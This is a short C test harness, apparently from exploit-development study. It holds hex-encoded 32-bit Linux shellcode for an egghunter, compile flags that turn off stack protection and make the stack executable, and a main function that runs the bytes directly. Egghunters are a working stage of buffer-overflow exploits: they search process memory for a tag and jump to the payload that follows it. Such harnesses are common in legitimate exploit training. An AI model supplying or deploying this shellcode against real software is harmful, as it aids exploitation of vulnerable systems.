// Compile with:
// gcc -fno-stack-protector -z execstack -o run_shellcode run_shellcode.c
#include <stdio.h>
#include <string.h>

// egghunter
unsigned char code[] = \
  "\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x0c\x58\xcd\x80\x3c"
  "\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xff\xe7";

main() {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
